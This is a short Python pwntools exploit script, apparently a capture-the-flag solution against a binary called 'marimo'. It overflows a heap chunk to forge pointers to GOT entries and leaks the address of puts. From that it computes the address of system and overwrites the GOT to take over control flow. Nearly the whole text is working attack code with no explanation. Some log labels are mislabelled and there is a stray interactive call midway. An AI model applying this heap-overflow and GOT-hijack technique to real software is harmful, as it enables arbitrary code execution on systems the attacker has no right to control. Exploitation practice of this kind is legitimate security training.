from pwn import *

e = ELF('./marimo')
r = process('./marimo')

r.recv(4096)
#################################
r.sendline('show me the marimo')
r.sendline('a'*0x10)
r.sendline('b'*0x10)
r.sendline('show me the marimo')
r.sendline('a'*0x10)
r.sendline('b'*0x20)
r.sendline('V')
r.interactive()
r.sendline('0')
zxc = r.recv().split('\n')[1]
zxc = p64(int(zxc.split(' : ')[1]))
r.info(zxc)
r.sendline('M')
r.sendline('1'*32+p64(0x0)+ p64(0x21)+zxc+ p64(0x603018) + p64(0x603040) + p32(0x21))
r.sendline('B')
r.sendline('V')
r.sendline('1')
asd = r.recv(4096)
r.info(asd.split('\n')) 
asd = asd.split('\n')[-5]

asd = u64(asd.split(' : ')[1]+"\x00"*2)
r.info("puts's got address : " + hex(asd))
################################
r.sendline('B')
r.sendline('V')
r.sendline('1')
r.sendline('M')
a = asd - 202112
r.info("_IO_getc's address : " +  hex(asd))
r.info("system's address : "+ hex(a))
times = asd + 335808
r.sendline(p64(a)+p64(times))
r.interactive()














